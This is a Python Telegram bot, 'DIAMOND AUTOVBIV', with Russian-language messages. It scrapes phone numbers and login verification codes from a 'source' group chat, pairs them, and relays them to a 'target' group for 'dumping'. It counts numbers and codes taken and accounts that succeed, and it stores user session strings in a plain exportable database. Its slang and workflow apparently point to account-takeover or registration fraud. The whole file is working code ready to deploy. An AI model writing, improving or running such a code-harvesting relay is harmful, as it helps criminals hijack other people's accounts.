# diamond_autovbiv.py
# FINAL FIXED - StringSession + правильный запуск

import os
import asyncio
import re
import sqlite3
import shutil
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from telethon.tl.custom import Button
from telethon.sessions import StringSession

# ========== КОНФИГ ==========
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

DB_PATH = "/app/diamond_data.db"
BACKUP_DIR = "/app/backups"
os.makedirs(BACKUP_DIR, exist_ok=True)

if not API_ID or not API_HASH or not BOT_TOKEN:
    print("❌ Ошибка: Установите переменные в Railway")
    exit(1)

# ========== БАЗА ДАННЫХ ==========
class DiamondDB:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                user_id INTEGER PRIMARY KEY,
                phone TEXT,
                session_string TEXT,
                step TEXT,
                created_at TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS groups (
                user_id INTEGER PRIMARY KEY,
                source_group INTEGER,
                target_group INTEGER
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                code TEXT,
                status TEXT,
                created_at TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                action TEXT,
                timestamp TIMESTAMP
            )
        ''')
        self.conn.commit()
    
    def save_session(self, user_id, phone, session_string, step):
        self.cursor.execute('''
            INSERT OR REPLACE INTO sessions (user_id, phone, session_string, step, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, phone, session_string, step, datetime.now()))
        self.conn.commit()
    
    def get_session(self, user_id):
        self.cursor.execute('SELECT session_string, phone, step FROM sessions WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        return row if row else (None, None, None)
    
    def is_authorized(self, user_id):
        session_string, _, _ = self.get_session(user_id)
        return bool(session_string and session_string.strip())
    
    def set_groups(self, user_id, source_group, target_group):
        self.cursor.execute('''
            INSERT OR REPLACE INTO groups (user_id, source_group, target_group)
            VALUES (?, ?, ?)
        ''', (user_id, source_group, target_group))
        self.conn.commit()
    
    def get_groups(self, user_id):
        self.cursor.execute('SELECT source_group, target_group FROM groups WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        return row if row else (None, None)
    
    def add_pending_number(self, user_id, phone):
        self.cursor.execute('''
            INSERT INTO pending (user_id, phone, status, created_at)
            VALUES (?, ?, 'waiting_code', ?)
        ''', (user_id, phone, datetime.now()))
        self.conn.commit()
    
    def update_pending_with_code(self, phone, code):
        self.cursor.execute('''
            UPDATE pending SET code = ?, status = 'code_received'
            WHERE phone = ? AND status = 'waiting_code'
        ''', (code, phone))
        self.conn.commit()
    
    def mark_success(self, phone):
        self.cursor.execute('''
            UPDATE pending SET status = 'success' WHERE phone = ? AND status = 'code_received'
        ''', (phone,))
        self.conn.commit()
    
    def add_stat(self, user_id, phone, action):
        self.cursor.execute('''
            INSERT INTO stats (user_id, phone, action, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (user_id, phone, action, datetime.now()))
        self.conn.commit()
    
    def get_stats_today(self, user_id):
        today = datetime.now().replace(hour=0, minute=0, second=0)
        self.cursor.execute('''
            SELECT action, COUNT(*) FROM stats 
            WHERE user_id = ? AND timestamp >= ?
            GROUP BY action
        ''', (user_id, today))
        return dict(self.cursor.fetchall())
    
    def get_last_pending_number(self, user_id):
        self.cursor.execute('''
            SELECT phone FROM pending 
            WHERE user_id = ? AND status = 'waiting_code' 
            ORDER BY created_at DESC LIMIT 1
        ''', (user_id,))
        row = self.cursor.fetchone()
        return row[0] if row else None
    
    def export_db(self, user_id):
        backup_path = os.path.join(BACKUP_DIR, f"diamond_backup_user_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, backup_path)
        return backup_path
    
    def import_db(self, file_path):
        shutil.copy2(file_path, DB_PATH)
        self.conn.close()
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.cursor = self.conn.cursor()
        return True

db = DiamondDB()

# ========== ОСНОВНОЙ БОТ ==========
bot = None
user_clients = {}
user_code_inputs = {}

# ========== КЛАВИАТУРА ==========
def get_code_keyboard():
    return [
        [Button.inline("1", b"1"), Button.inline("2", b"2"), Button.inline("3", b"3")],
        [Button.inline("4", b"4"), Button.inline("5", b"5"), Button.inline("6", b"6")],
        [Button.inline("7", b"7"), Button.inline("8", b"8"), Button.inline("9", b"9")],
        [Button.inline("0", b"0"), Button.inline("⌫", b"del"), Button.inline("✅", b"submit")]
    ]

# ========== ФУНКЦИИ ДЛЯ НОМЕРОВ И КОДОВ ==========
def clean_phone(phone):
    cleaned = re.sub(r'[^\d+]', '', phone)
    cleaned = re.sub(r'^\+{2,}', '+', cleaned)
    if cleaned.startswith('8'):
        cleaned = '+7' + cleaned[1:]
    elif cleaned.startswith('7') and not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    elif cleaned.startswith('9'):
        cleaned = '+7' + cleaned
    elif not cleaned.startswith('+') and cleaned.isdigit():
        cleaned = '+' + cleaned
    if cleaned.startswith('+') and len(cleaned) > 12:
        cleaned = '+' + cleaned[1:12]
    return cleaned

def extract_phone_from_text(text):
    patterns = [
        r'\+?7\d{10}', r'8\d{10}', r'\+?79\d{9}', r'[78]\d{10}',
        r'\d{11}', r'\d{10}',
        r'\+?\d{1,3}[-.\s]?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{2}[-.\s]?\d{2}',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            cleaned = clean_phone(match)
            if cleaned.startswith('+') and len(cleaned) == 12 and cleaned[1:].isdigit():
                return cleaned
            if len(cleaned) == 11 and cleaned.isdigit():
                return '+' + cleaned
    return None

def extract_code_from_text(text):
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

async def get_user_client(user_id, session_string=None):
    if user_id in user_clients:
        client = user_clients[user_id]
        if client.is_connected():
            return client
    if not session_string:
        session_string, _, _ = db.get_session(user_id)
        if not session_string:
            return None
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        if await client.is_user_authorized():
            user_clients[user_id] = client
            return client
        else:
            return None
    except Exception as e:
        print(f"[ERROR] get_user_client: {e}")
        return None

# ========== ОБРАБОТЧИКИ ==========
async def setup_handlers():
    global bot
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(event):
        await event.reply("""
💎 DIAMOND AUTOVBIV BOT (StringSession)

/login +79991234567
/set_source — в группе с номерами/кодами
/set_target — в группе для слива/"встал"
/stats — статистика
/status — статус
/export — выгрузить БД
/reset — сброс
        """)
    
    @bot.on(events.NewMessage(pattern='/login (.+)'))
    async def login_cmd(event):
        user_id = event.sender_id
        phone = clean_phone(event.pattern_match.group(1).strip())
        await event.reply(f"📱 Отправляю код на {phone}...")
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            await client.send_code_request(phone)
            user_clients[user_id] = client
            db.save_session(user_id, phone, "", "waiting_code")
            user_code_inputs[user_id] = {'code': '', 'phone': phone, 'attempts': 0}
            await event.reply(
                f"✅ Код отправлен на {phone}\n\n🔢 Введите код через кнопки:\n\nКод: ` `",
                buttons=get_code_keyboard()
            )
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)}")
    
    @bot.on(events.NewMessage(pattern='/2fa (.+)'))
    async def twofa_cmd(event):
        user_id = event.sender_id
        password = event.pattern_match.group(1).strip()
        _, _, step = db.get_session(user_id)
        client = user_clients.get(user_id)
        if not client or step != "waiting_2fa":
            await event.reply("❌ Сначала /login")
            return
        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            phone = (await client.get_me()).phone
            db.save_session(user_id, phone, session_string, "authorized")
            await event.reply(f"✅ Вход выполнен!\nАккаунт: {phone}\n\n🔑 Session string:\n`{session_string}`")
            source, target = db.get_groups(user_id)
            if source:
                asyncio.create_task(start_source_listener(user_id, client, source))
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)}")
    
    @bot.on(events.CallbackQuery())
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data.decode('utf-8')
        if user_id not in user_code_inputs:
            await event.answer("❌ Сначала /login", alert=True)
            return
        current = user_code_inputs[user_id]['code']
        phone = user_code_inputs[user_id]['phone']
        if data.isdigit():
            user_code_inputs[user_id]['code'] += data
            new = user_code_inputs[user_id]['code']
            await event.answer(f"Код: {new}")
            await event.edit(f"Код: `{new}`", buttons=get_code_keyboard())
        elif data == 'del':
            user_code_inputs[user_id]['code'] = current[:-1]
            new = user_code_inputs[user_id]['code']
            await event.answer("Удалено")
            await event.edit(f"Код: `{new}`", buttons=get_code_keyboard())
        elif data == 'submit':
            code = user_code_inputs[user_id]['code']
            if not code:
                await event.answer("Введите код!", alert=True)
                return
            await event.answer("⏳ Проверяю...")
            client = user_clients.get(user_id)
            if not client:
                await event.edit("❌ Клиент потерян, начните /login заново")
                del user_code_inputs[user_id]
                return
            try:
                await client.sign_in(code=code)
                session_string = client.session.save()
                user_phone = (await client.get_me()).phone
                db.save_session(user_id, user_phone, session_string, "authorized")
                await event.edit(
                    f"✅ **Вход выполнен!**\n\n📱 Аккаунт: `{user_phone}`\n\n"
                    f"🔑 **Session string (сохраните):**\n`{session_string}`\n\n"
                    f"Теперь /set_source и /set_target"
                )
                await bot.send_message(
                    user_id,
                    f"🔐 **Session string для {user_phone}:**\n\n`{session_string}`\n\nСохраните!"
                )
                source, target = db.get_groups(user_id)
                if source:
                    asyncio.create_task(start_source_listener(user_id, client, source))
                del user_code_inputs[user_id]
            except PhoneCodeInvalidError:
                user_code_inputs[user_id]['attempts'] += 1
                if user_code_inputs[user_id]['attempts'] >= 3:
                    await event.edit("❌ 3 неверных попытки. /login заново")
                    del user_code_inputs[user_id]
                else:
                    user_code_inputs[user_id]['code'] = ''
                    await event.edit(f"❌ Неверный код! Попробуйте ещё\nКод: ` `", buttons=get_code_keyboard())
            except SessionPasswordNeededError:
                db.save_session(user_id, phone, "", "waiting_2fa")
                await event.edit("🔐 Требуется 2FA: /2fa <пароль>")
                del user_code_inputs[user_id]
            except Exception as e:
                await event.edit(f"❌ {str(e)}")
                del user_code_inputs[user_id]
    
    @bot.on(events.NewMessage(pattern='(?i)/set_source'))
    async def set_source_cmd(event):
        user_id = event.sender_id
        if event.is_group:
            source_group = event.chat_id
            _, target_group = db.get_groups(user_id)
            db.set_groups(user_id, source_group, target_group)
            await event.reply(f"✅ **ГРУППА-ИСТОЧНИК установлена!**")
            if db.is_authorized(user_id):
                session_string, _, _ = db.get_session(user_id)
                if session_string:
                    client = await get_user_client(user_id, session_string)
                    if client:
                        asyncio.create_task(start_source_listener(user_id, client, source_group))
        else:
            await event.reply("❌ Команда работает только в группе.")
    
    @bot.on(events.NewMessage(pattern='(?i)/set_target'))
    async def set_target_cmd(event):
        user_id = event.sender_id
        if event.is_group:
            target_group = event.chat_id
            source_group, _ = db.get_groups(user_id)
            db.set_groups(user_id, source_group, target_group)
            await event.reply(f"✅ **ГРУППА-ЦЕЛЬ установлена!**")
            if source_group and db.is_authorized(user_id):
                session_string, _, _ = db.get_session(user_id)
                if session_string:
                    client = await get_user_client(user_id, session_string)
                    if client:
                        asyncio.create_task(start_source_listener(user_id, client, source_group))
        else:
            await event.reply("❌ Команда работает только в группе.")
    
    @bot.on(events.NewMessage(pattern='/stats'))
    async def stats_cmd(event):
        user_id = event.sender_id
        stats = db.get_stats_today(user_id)
        msg = f"📊 СТАТИСТИКА ЗА СЕГОДНЯ\n\n📱 Номеров: {stats.get('number_taken',0)}\n🔢 Кодов: {stats.get('code_taken',0)}\n✅ Встало: {stats.get('success',0)}"
        await event.reply(msg)
    
    @bot.on(events.NewMessage(pattern='/status'))
    async def status_cmd(event):
        user_id = event.sender_id
        session_string, phone, step = db.get_session(user_id)
        source, target = db.get_groups(user_id)
        auth = "✅" if db.is_authorized(user_id) else "❌"
        has_sess = "есть" if session_string else "нет"
        msg = f"⚙️ СТАТУС\n\n👤 Аккаунт: {phone or '❌'}\n🔐 Авторизован: {auth}\n📦 Сессия в БД: {has_sess}\n📥 Источник: {source or '❌'}\n📤 Цель: {target or '❌'}"
        await event.reply(msg)
    
    @bot.on(events.NewMessage(pattern='/export'))
    async def export_cmd(event):
        user_id = event.sender_id
        if not db.is_authorized(user_id):
            await event.reply("❌ Сначала /login")
            return
        backup_path = db.export_db(user_id)
        await event.reply("📦 Выгрузка БД...")
        await bot.send_file(event.chat_id, backup_path, caption="💎 diamond_data.db")
    
    @bot.on(events.NewMessage(pattern='/reset'))
    async def reset_cmd(event):
        user_id = event.sender_id
        if user_id in user_clients:
            await user_clients[user_id].disconnect()
            del user_clients[user_id]
        db.cursor.execute('DELETE FROM sessions WHERE user_id = ?', (user_id,))
        db.cursor.execute('DELETE FROM groups WHERE user_id = ?', (user_id,))
        db.conn.commit()
        await event.reply("✅ Сброшено. Используйте /login")
    
    # ========== ЛОГИКА ПЕРЕХВАТА ==========
    async def start_source_listener(user_id, client, source_group_id):
        @client.on(events.NewMessage(chats=source_group_id))
        async def handle_source(event):
            try:
                if event.sender_id == (await client.get_me()).id:
                    return
                text = event.raw_text.strip()
                phone = extract_phone_from_text(text)
                if phone:
                    db.add_pending_number(user_id, phone)
                    db.add_stat(user_id, phone, 'number_taken')
                    _, target = db.get_groups(user_id)
                    if target:
                        await client.send_message(target, f"📱 НОМЕР: `{phone}`")
                    return
                code = extract_code_from_text(text)
                if code:
                    last = db.get_last_pending_number(user_id)
                    if last:
                        db.update_pending_with_code(last, code)
                        db.add_stat(user_id, last, 'code_taken')
                        _, target = db.get_groups(user_id)
                        if target:
                            await client.send_message(target, f"🔢 КОД: `{code}`\nДля номера: `{last}`")
            except Exception as e:
                print(f"[ERROR] handle_source: {e}")
    
    @bot.on(events.NewMessage())
    async def handle_target(event):
        try:
            user_id = event.sender_id
            _, target = db.get_groups(user_id)
            if not target or event.chat_id != target:
                return
            text = event.raw_text.lower()
            if 'встал' in text or 'успех' in text:
                phone = extract_phone_from_text(text)
                if phone:
                    db.mark_success(phone)
                    db.add_stat(user_id, phone, 'success')
                    await event.reply(f"✅ {phone} — ВСТАЛ!")
                else:
                    last = db.get_last_pending_number(user_id)
                    if last:
                        db.mark_success(last)
                        db.add_stat(user_id, last, 'success')
                        await event.reply(f"✅ {last} — ВСТАЛ!")
        except Exception as e:
            print(f"[ERROR] handle_target: {e}")

# ========== ВОССТАНОВЛЕНИЕ СЕССИЙ ==========
async def restore_sessions():
    print("[LOG] Восстановление сессий из БД...")
    db.cursor.execute('SELECT user_id, session_string FROM sessions WHERE session_string IS NOT NULL AND session_string != ""')
    rows = db.cursor.fetchall()
    for user_id, sess_str in rows:
        try:
            client = TelegramClient(StringSession(sess_str), API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                user_clients[user_id] = client
                print(f"[LOG] Сессия {user_id} восстановлена")
                source, _ = db.get_groups(user_id)
                if source:
                    asyncio.create_task(start_source_listener(user_id, client, source))
            else:
                print(f"[LOG] Сессия {user_id} невалидна")
        except Exception as e:
            print(f"[LOG] Ошибка восстановления {user_id}: {e}")

# ========== ЗАПУСК ==========
async def main():
    global bot
    print("💎 DIAMOND AUTOVBIV BOT v4.2")
    print(f"📡 API_ID: {API_ID}")
    bot = TelegramClient("diamond_bot", API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    await restore_sessions()
    await setup_handlers()
    print("✅ Бот запущен!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
